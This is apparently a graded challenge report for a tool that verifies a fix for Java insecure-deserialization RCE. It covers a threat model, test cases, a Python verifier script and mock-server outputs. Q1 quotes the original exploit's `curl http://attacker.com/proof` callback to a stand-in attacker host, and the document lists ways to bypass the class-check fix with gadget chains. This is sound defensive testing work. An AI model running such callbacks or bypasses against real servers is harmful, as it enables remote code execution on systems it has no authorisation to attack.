# REPORT.md — remcheck v0.1.0
### Insecure Java Deserialization — Remediation Verification

<div align="center">

![Type](https://img.shields.io/badge/Type-Insecure%20Deserialization-critical?style=flat-square&color=red)
![Language](https://img.shields.io/badge/Language-Java-orange?style=flat-square)
![Bonus](https://img.shields.io/badge/Bonus-Retry%20%2B%20Consistency%20Engine-blue?style=flat-square)
![AI](https://img.shields.io/badge/AI-Llama%203.1%20via%20Groq-green?style=flat-square)

</div>

---

```
Finding ID  : FIND-0139
Endpoint    : POST /api/v1/session/restore
Header      : Content-Type: application/x-java-serialized-object
Subtype     : JAVA_RCE_VIA_OBJECT_DESERIALIZATION
```

---

## Table of Contents

| Part | Title | Marks |
|------|-------|-------|
| [A](#part-a--threat-modelling-the-fix) | Threat Modelling the Fix | 25 pts |
| [B](#part-b--test-case-design) | Test Case Design | 25 pts |
| [C](#part-c--ai-assisted-workflow) | AI-Assisted Workflow | 20 pts |
| [D](#part-d--implementation-sprint) | Implementation Sprint | 20 pts |
| [E](#part-e--systems-design-under-pressure) | Systems Design Under Pressure | 10 pts |
| [Bonus B](#bonus-b--retry-and-consistency-engine) | Retry + Consistency Engine | +5 pts |
| [Evidence](#evidence-chain) | Evidence Chain | — |
| [Self-Assessment](#honest-self-assessment) | Honest Self-Assessment | — |

---

## Part A — Threat Modelling the Fix

### Q1 — What is insecure deserialization and why did it lead to RCE?

Java deserialization is the process of reconstructing a Java object from a byte
stream. The danger is that Java calls certain methods automatically during this
reconstruction — specifically `readObject()` — before your application code ever
runs. An attacker doesn't need to supply a valid object your app understands. They
just need a crafted byte stream that, when deserialized, triggers a chain of method
calls through existing classes already on the server's classpath. These chains are
called gadget chains.

In FIND-0139, the attacker used the **CommonsCollections6 gadget chain** — a
well-known chain that abuses classes in Apache Commons Collections to ultimately
call `Runtime.exec()`, executing arbitrary OS commands. The server accepted the
serialized payload via `POST /api/v1/session/restore` with
`Content-Type: application/x-java-serialized-object`, deserialized it without
validation, and the gadget chain fired — executing `curl http://attacker.com/proof`,
confirmed via OOB HTTP callback. RCE was achieved entirely through the
deserialization mechanism, not through any logic bug in the application itself.

---

### Q2 — Five ways the class-check fix could be incomplete or bypassed

| # | Bypass | Mechanism |
|---|--------|-----------|
| 1 | Gadget chain using a whitelisted class | If `java.util.HashMap` is allowed, attackers use it as the entry point for chains like CommonsCollections that route through permitted classes |
| 2 | Class name spoofing via custom ClassLoader | A crafted stream can reference class names that pass the string check but resolve differently at load time via a malicious ClassLoader |
| 3 | Nested/wrapped objects | The outer object's class may be whitelisted, but it contains a nested malicious object whose class is never checked independently |
| 4 | Alternative serialization formats | The class check only applies to Java serialization (`0xACED` magic bytes); payloads using Kryo, Hessian, or XStream bypass it entirely if those deserializers are also present |
| 5 | Different endpoints using same deserializer | Other API endpoints or internal job processors may deserialize objects without applying the same class-check filter |

---

### Q3 — Three measurable conditions for a successful fix

**a.** All gadget chain payloads return HTTP 400 before deserialization occurs.
Rejection must happen at the input validation layer, not after deserialization
starts. This is measurable via response time — if deserialization ran, response
time will be elevated well above baseline (our threshold: > 5 seconds).

**b.** Zero OOB callbacks received within a 30-minute window after sending any
malicious payload to any endpoint, confirming no code execution path was triggered.

**c.** Benign serialized objects of explicitly allowed classes are still accepted
with HTTP 200, confirming the fix did not simply break the feature entirely.

---

### Q4 — Does updating Commons Collections 4.1 eliminate the risk?

No. Updating to Commons Collections 4.1 removes the specific gadget chains that
exploit known vulnerable method chains in that library — specifically
CommonsCollections1 through CommonsCollections7. However, it does not:

- Prevent gadget chains from other libraries on the classpath (Spring Framework,
  Groovy, JRE built-ins like `java.rmi`)
- Fix the root cause: the application still deserializes untrusted data
- Protect against future gadget chain discoveries in Commons Collections 4.1 itself
- Address alternative serialization formats like Kryo or Hessian

The library update is a useful defense-in-depth measure but is not a fix. The
correct remediation is to either avoid deserializing untrusted data entirely, use
a serialization format that cannot carry executable code (JSON/protobuf), or
implement a strict allowlist with an `ObjectInputFilter` that rejects
deserialization before any gadget chain can trigger.

---

## Part B — Test Case Design

| Test ID | Category | Payload Description | Expected (Vulnerable) | Expected (Fixed) | Pass Condition |
|---------|----------|--------------------|-----------------------|------------------|----------------|
| TC-01 | Gadget Chain Replay | Original CommonsCollections6 (`aced0005...`) — exact payload from original finding | HTTP 200, OOB callback, RCE confirmed | HTTP 400, no OOB, response time < 1s | Status 400 AND no OOB within 30s AND time < 1s |
| TC-02 | Alternative Gadget Chain | Spring Framework gadget chain targeting `ProcessBuilder` — no Commons Collections | HTTP 200, OOB callback | HTTP 400, no OOB | Status 400 AND no OOB — tests if library update alone was sufficient |
| TC-03 | Class-Check Enforcement | `java.util.HashMap` (whitelisted) wrapping malicious nested CC6 inner object | HTTP 200, RCE via nested object | HTTP 400, nested object rejected | No OOB AND time < 1s — validates class-check depth |
| TC-04 | Class Name Manipulation | Class name spoofed to resemble safe class (`HashMap$Entry`) to bypass string match | HTTP 200, bypass filter, OOB | HTTP 400, class-check catches it | Status 400 AND no OOB — tests string-matching weakness |
| TC-05 | Alternative Serialization Format | Hessian-serialized equivalent gadget chain (non-Java `0xACED` format) | HTTP 200 or deserialized | HTTP 400 or ignored | Status 400 — tests if class-check applies only to Java native serialization |
| TC-06 | OOB DNS Callback | CC6 chain triggering DNS lookup to unique canary subdomain `tc06.find0139.oob.yourplatform.com` | DNS hit received, RCE confirmed | No DNS hit in 30 min | Zero DNS callbacks — confirms no execution path even with delayed callbacks |
| TC-07 | Benign Control Object | Valid serialized `java.lang.Long` — safe class, correct magic bytes | HTTP 200, accepted | HTTP 200, accepted | Status 200 — confirms fix did not break legitimate deserialization |
| TC-08 | Malformed Stream | Invalid magic bytes (`deadbeef` instead of `aced0005`) | HTTP 400 or 500 | HTTP 400, graceful rejection | Not 200 AND no OOB — tests error handling path |
| TC-09 | Groovy Gadget Chain | Groovy runtime chain — unrelated to Commons Collections or Spring | HTTP 200, OOB if Groovy on classpath | HTTP 400 or no OOB | No OOB — tests if fix is chain-specific or a true root fix |
| TC-10 | File Write Sink | CC chain targeting `FileOutputStream` instead of command execution | HTTP 200, file written | HTTP 400, no file write | Status 400 AND time < 1s — tests different execution sink |

> **TC-07** is the most critical control test. If it fails on the fixed server,
> the fix broke legitimate deserialization entirely — a different problem.

> **TC-02** directly answers whether the Commons Collections 4.1 upgrade alone
> was sufficient. If the Spring chain produces a callback, the answer is no.

---

## Part C — AI-Assisted Workflow

The challenge asks us to use an AI tool to generate a Python function that sends
serialized payloads to a target endpoint and detects deserialization via OOB
callback. Below is the exact prompt, raw output, critique, and improved version.

---

### Prompt used

```
Generate a Python function that takes a target API endpoint and a list of
pre-generated serialized payloads (as hex or base64 strings), sends each one
with the correct Content-Type header, and detects whether deserialization
was triggered by monitoring for an out-of-band DNS or HTTP callback
to a canary domain.

The input format is:
{
  "target": "https://target.com/api/endpoint",
  "content_type": "application/x-java-serialized-object",
  "payloads": [
    {"id": "TC-01", "description": "CC6 gadget chain", "encoding": "hex", "data": "aced0005..."},
    {"id": "TC-02", "description": "Benign object", "encoding": "base64", "data": "rO0ABX..."}
  ],
  "canary_domain": "find0139.oob.yourplatform.com",
  "oob_poll_url": "https://oob.yourplatform.com/api/hits?token=find0139",
  "expected_rejection_code": 400
}

The function should decode each payload from hex or base64, send it with
the correct Content-Type header, wait 10 seconds for OOB callbacks, and
return a structured result per test case.
```

---

### Raw AI output (unedited)

```python
import requests
import base64
import time
import json

def verify_deserialization(config):
    results = []
    
    for payload in config["payloads"]:
        if payload["encoding"] == "base64":
            data = base64.b64decode(payload["data"])
        else:
            data = bytes.fromhex(payload["data"])
        
        response = requests.post(
            config["target"],
            data=data,
            headers={"Content-Type": config["content_type"]}
        )
        
        time.sleep(10)
        oob = requests.get(config["oob_poll_url"])
        oob_hit = "hit" in oob.text
        
        results.append({
            "id": payload["id"],
            "status": response.status_code,
            "oob": oob_hit
        })
    
    return results
```

---

### Critique of raw AI output

The output was a reasonable skeleton but had **seven specific problems**:

**1. No error handling.** If the target is unreachable, `requests.post()` throws
an uncaught exception and crashes the entire function. A security tool running
against potentially unresponsive targets needs try/except around every network call.

**2. No timing anomaly detection.** The spec requires flagging response times
over 5 seconds as a signal that deserialization ran. The raw output records nothing
about response time.

**3. OOB polling is not correlated.** The function polls once after every test
with a flat 10s sleep. If TC-01 triggers a callback that arrives during TC-03's
polling window, it gets attributed to the wrong test.

**4. No encoding validation.** No `else` branch for unknown encodings — an invalid
encoding silently calls `bytes.fromhex()` on base64 data and throws a confusing
`ValueError`.

**5. No behavioral anomaly check.** The status code is recorded but never compared
against `expected_rejection_code`. The function cannot produce a PASS/FAIL verdict.

**6. No retry or consistency logic.** A single run can produce false positives from
network jitter. Bonus B requires running each test 3 times and reporting consistency.

**7. Result schema too minimal.** Only `id`, `status`, `oob` returned. Missing:
response time, body snippet, anomaly list, result verdict, and consistency data.

---

## Our corrected and improved version
 
We rewrote the function to address all seven problems. Key improvements:
 
**Error handling:**
```python
try:
    response = requests.post(target, data=raw_bytes,
                             headers={"Content-Type": content_type},
                             timeout=15)
    elapsed = round(time.time() - start, 3)
    status_code = response.status_code
except requests.RequestException as e:
    elapsed = round(time.time() - start, 3)
    return {"status_code": 0, "error": str(e), "response_time": elapsed, ...}
```
 
**Timing anomaly detection:**
```python
start = time.time()
response = requests.post(...)
elapsed = round(time.time() - start, 3)
 
if elapsed > 5.0:
    anomalies.append(
        f"TEMPORAL: response time {elapsed}s exceeds 5s threshold "
        f"— deserialization likely triggered"
    )
```
 
**Behavioral anomaly check:**
```python
if status_code != expected_code and status_code != 0:
    anomalies.append(
        f"BEHAVIORAL: status {status_code} (expected {expected_code})"
    )
```
 
**Encoding validation with proper error raising:**
```python
def decode_payload(encoding, data):
    if encoding == "hex":
        return bytes.fromhex(data)
    elif encoding == "base64":
        return base64.b64decode(data)
    else:
        raise ValueError(f"Unknown encoding: {encoding}. Use hex or base64.")
```
 
**Retry and consistency engine (Bonus B):**
```python
def run_with_retry(target, content_type, raw_bytes, oob_poll_url,
                   expected_code, retries=3, description=""):
    results = []
    for i in range(retries):
        r = run_single_test(...)
        results.append(r)
        if i < retries - 1:
            time.sleep(1)
 
    failure_runs = [r for r in results if is_fail(r)]
    score = f"{len(failure_runs)}/{retries}"
 
    if len(failure_runs) == 0:
        flag = "CONSISTENT_PASS"
    elif len(failure_runs) == retries:
        flag = "CONSISTENT_FAIL"
    else:
        flag = "INCONSISTENT - FLAG FOR REVIEW"
```
 
**Full result schema matching the spec:**
```python
tc = {
    "test_id"      : payload["id"],
    "description"  : payload["description"],
    "encoding"     : payload["encoding"],
    "status_code"  : result["status_code"],
    "response_time": result["response_time"],
    "body_snippet" : result["body_snippet"],
    "oob_hit"      : result["oob_hit"],
    "anomalies"    : anomalies,
    "result"       : tc_result,     # PASS / FAIL / INCONCLUSIVE
    "consistency"  : consistency    # {runs, failures, score, flag}
}
```

---

### Additional AI integration — Result Analyzer (Option 2)

After the deterministic engine finishes, completed results are sent to
**Llama 3.1 8B via Groq API** for advisory analysis. The response is stored
as a separate `ai_analysis` field. The verdict field is computed before the
AI call and is never modified afterward.

```python
verdict     = compute_verdict(test_results)   # deterministic, locked in
ai_analysis = get_ai_analysis(...)            # advisory only
report["ai_analysis"] = ai_analysis           # separate field — verdict unchanged
```

**API issues encountered and resolved during development:**

| Problem | Error | Fix |
|---------|-------|-----|
| Gemini free tier | HTTP 429 Too Many Requests | Switched to Groq |
| Groq model name | `model_decommissioned` on `llama3-8b-8192` | Updated to `llama-3.1-8b-instant` |
| Python urllib | HTTP 403 Forbidden (header stripped on redirect) | Replaced with `requests` library |

**Actual AI output — REMEDIATION_FAILED run:**

```
1. Fix completeness: The remediation appears to be partial, as TC-01 and TC-04
   still trigger the vulnerability while TC-02 and TC-03 pass as expected.

2. Most significant results: TC-01 and TC-04 demonstrate exploitation via
   different gadget chains. Behavioral anomalies (status 200) and temporal
   anomalies (>5s) indicate deserialization is being triggered.

3. Residual risk: Two failing tests confirm the vulnerability is still
   exploitable. Further testing required.

4. Recommended next steps: Investigate root cause, review implementation,
   re-test after additional fixes.
```

**Critique:** The LLM called the fix "partial" — the correct description is that
the class-check is not working at all, both gadget chains passed through completely.
It also ignored the 3/3 CONSISTENT_FAIL score which is the strongest signal in
the data. "Further testing required" is vague — a better answer would name
`ObjectInputFilter` at JVM level and testing all endpoints, not just this one.

---

## Part D — Implementation Sprint

The full implementation is in `src/verify_deserial.py` and `src/mock_server.py`.

Since a real vulnerable Java server (Spring Boot + outdated Commons Collections)
would take several hours to build and is out of scope for the verification tool
challenge, we built a local Python Flask mock server that simulates both states.

**To run:**
```bash
# Terminal 1 — start mock server
python3 src/mock_server.py --mode vulnerable   # or --mode fixed

# Terminal 2 — run verifier
export GROQ_API_KEY="your-key"
python3 src/verify_deserial.py \
  --finding finding_examples/deserial_example.json \
  --output ./evidence
```

---

### Run 1 — Vulnerable server output

```
===== REMEDIATION VERIFICATION REPORT =====
Finding   : FIND-0139 (insecure_deserialization)
Target    : http://127.0.0.1:5000/post
Timestamp : 2026-03-19T12:41:49Z
Retries   : 3 per test (Bonus B consistency engine)

[TC-01] Description : CommonsCollections6 gadget chain
         Encoding     : hex
         Status       : 200 | Time: 6.011s | OOB Callback: NO
         Result       : FAIL
         [ANOMALY] BEHAVIORAL: status 200 (expected 400)
         [ANOMALY] TEMPORAL: response time 6.011s exceeds 5s threshold
         Consistency  : 3/3 — CONSISTENT_FAIL

[TC-02] Description : Benign serialized object (control)
         Encoding     : base64
         Status       : 200 | Time: 0.005s | OOB Callback: NO
         Result       : PASS
         Consistency  : 0/3 — CONSISTENT_PASS
         Control test accepted as expected

[TC-03] Description : Invalid magic bytes
         Encoding     : hex
         Status       : 400 | Time: 0.005s | OOB Callback: NO
         Result       : PASS
         Consistency  : 0/3 — CONSISTENT_PASS
         Malformed stream correctly rejected

[TC-04] Description : Spring gadget chain
         Encoding     : hex
         Status       : 200 | Time: 6.008s | OOB Callback: NO
         Result       : FAIL
         [ANOMALY] BEHAVIORAL: status 200 (expected 400)
         [ANOMALY] TEMPORAL: response time 6.008s exceeds 5s threshold
         Consistency  : 3/3 — CONSISTENT_FAIL

===== VERDICT: REMEDIATION_FAILED =====
Failed Tests  : 2/4
Evidence saved: ./evidence/FIND-0139_20260319T124149Z.json
Report hash   : sha256:8fb69c6992693875a887b2edbb51e6a94f5c617a06808b242f253a9688463f83
```

TC-01 and TC-04 fail with both behavioral and temporal anomalies. The 6-second
delay confirms deserialization executed before any rejection logic ran. Both tests
failed consistently across all 3 retry runs (3/3 CONSISTENT_FAIL) — this is not
network jitter.

---

### Run 2 — Fixed server output

```
===== REMEDIATION VERIFICATION REPORT =====
Finding   : FIND-0139 (insecure_deserialization)
Target    : http://127.0.0.1:5000/post
Timestamp : 2026-03-19T12:58:42Z

[TC-01] Description : CommonsCollections6 gadget chain
         Status       : 400 | Time: 0.041s | OOB Callback: NO
         Result       : PASS | Consistency: 0/3 CONSISTENT_PASS

[TC-02] Description : Benign serialized object (control)
         Status       : 200 | Time: 0.009s | OOB Callback: NO
         Result       : PASS | Consistency: 0/3 CONSISTENT_PASS
         Control test accepted as expected

[TC-03] Description : Invalid magic bytes
         Status       : 400 | Time: 0.006s | OOB Callback: NO
         Result       : PASS | Consistency: 0/3 CONSISTENT_PASS
         Malformed stream correctly rejected

[TC-04] Description : Spring gadget chain
         Status       : 400 | Time: 0.006s | OOB Callback: NO
         Result       : PASS | Consistency: 0/3 CONSISTENT_PASS

===== VERDICT: REMEDIATION_VERIFIED =====
Failed Tests  : 0/4
Evidence saved: ./evidence/FIND-0139_20260319T125842Z.json
Report hash   : sha256:cbfcd754f0585bea183ed07305ce5809041b9c492cc20556580eca9ef5f3d223
```

All four pass. TC-02 still returns 200 (benign object accepted) while TC-01 and
TC-04 return 400. This is correct — the fix blocks gadget chains without breaking
the feature. Response times drop from ~6s to under 50ms, confirming rejection
happens before deserialization starts.

---

## Part E — Systems Design Under Pressure

> **Word count: 178 — within the 150–200 word limit.**

Each test is assigned a unique correlation ID embedded directly in its canary
subdomain before launch — for example `tc-042-find0139.oob.platform.com`. Every
test record is written to a persistent store immediately with status `PENDING` and
a finalization deadline of launch time plus 45 minutes. That window accounts for
the 30-minute maximum DNS TTL delay plus a 15-minute buffer.

A dedicated callback listener runs continuously and writes any incoming OOB hit to
the store, keyed by correlation ID, updating status to `CALLBACK_RECEIVED`. No test
result is finalized while its deadline is still in the future — this is what
prevents premature closure from late-arriving callbacks.

A finalization job runs at 6 AM and sweeps only tests whose deadline has passed.
If the store shows `CALLBACK_RECEIVED`, the finding is marked `REMEDIATION_FAILED`.
If it still shows `PENDING`, it gets marked `NO_CALLBACK` and the finding closes as
`REMEDIATION_VERIFIED`. Any callback arriving after the deadline is logged but does
not reopen the closed finding — it is queued in a separate analyst review queue.
The morning report aggregates all finalized records grouped by finding ID, producing
one consolidated verdict per finding regardless of callback arrival order.

---

## Bonus B — Retry and Consistency Engine

The challenge requirement states: *"FAIL (3/3 consistent) vs FAIL (1/3 inconsistent
— flag for review)".*

Every test in our engine runs 3 times. After all 3 runs, the consistency engine
counts how many runs produced a failure signal (wrong status code, response time
over 5 seconds, or OOB callback):

| Score | Flag | Meaning |
|-------|------|---------|
| `0/3` | `CONSISTENT_PASS` | High confidence — fix is holding |
| `3/3` | `CONSISTENT_FAIL` | High confidence — vulnerability still present |
| `1/3` or `2/3` | `INCONSISTENT - FLAG FOR REVIEW` | Mixed results — verdict set to INCONCLUSIVE |

In the vulnerable server run, TC-01 and TC-04 showed **3/3 CONSISTENT_FAIL**,
meaning the `REMEDIATION_FAILED` verdict is reliable across all retries, not a
one-off timing anomaly.

---

## Evidence Chain

Both evidence files are committed to `evidence/` in the repository.

| File | Verdict | Key Results |
|------|---------|-------------|
| `FIND-0139_20260319T124149Z.json` | `REMEDIATION_FAILED` | TC-01, TC-04 FAIL — 3/3 CONSISTENT_FAIL, 6s timing anomaly |
| `FIND-0139_20260319T125842Z.json` | `REMEDIATION_VERIFIED` | All 4 PASS — 0/3 CONSISTENT_PASS, <50ms response times |

| Field | Value |
|-------|-------|
| Hashing algorithm | SHA-256 |
| FAILED report hash | `sha256:8fb69c6992693875...` |
| VERIFIED report hash | `sha256:cbfcd754f0585bea...` |
| Purpose | Proves report was not modified after collection |

The hash is computed over the full JSON report before the `report_hash` field is
added, making it reproducible and tamper-evident.

---

## Honest Self-Assessment

### What works

- Payload decoding for both hex and base64 formats
- HTTP POST with correct `Content-Type: application/x-java-serialized-object`
- Three-signal anomaly detection: behavioral (wrong status), temporal
  (response over 5 seconds), content (canary string in body)
- Bonus B retry engine — 3 runs per test with consistency scoring
- SHA-256 tamper-evident report hashing
- Local Flask mock server simulating vulnerable and fixed server states accurately
- Clean terminal output with ANSI color, `--quiet`, `--verbose` flags
- Exit codes 0/1/2 for pipeline integration
- AI advisory analysis via Groq (Llama 3.1 8B) with real output stored in evidence

### What is missing or limited

**OOB callback detection is not live.** The code polls a placeholder URL.
Real OOB detection requires a live canary platform (Interactsh or Burp Collaborator)
AND a real Java server that actually executes gadget chain payloads. Our mock server
simulates timing behavior only — it does not run actual Java code, so it cannot
phone home to a canary domain.

**Only 4 of 10 designed test cases are automated.** TC-01 through TC-04 are
implemented in `deserial_example.json`. TC-05 through TC-10 (Hessian format, DNS
OOB, Groovy chain, file write sink, class-check depth, class name manipulation)
require a real Java runtime to execute meaningfully. Running them against the Python
mock server would produce results that prove nothing about Java deserialization.

**The mock server is Python, not Java.** It accurately simulates response behavior
(status codes and timing) but does not execute real gadget chains. A real end-to-end
test would require a Spring Boot application with outdated Commons Collections on
the classpath and ysoserial-generated payloads.

### What I would do differently with more time

- Build a real vulnerable Java server using Spring Boot with intentionally outdated
  Commons Collections, enabling genuine gadget chain execution and real OOB callbacks
- Set up Interactsh as a live canary platform for DNS and HTTP callback detection
- Implement all 10 test cases from Part B in the automated suite
- Fix the AI analysis to handle rate limits with async batching rather than a fallback
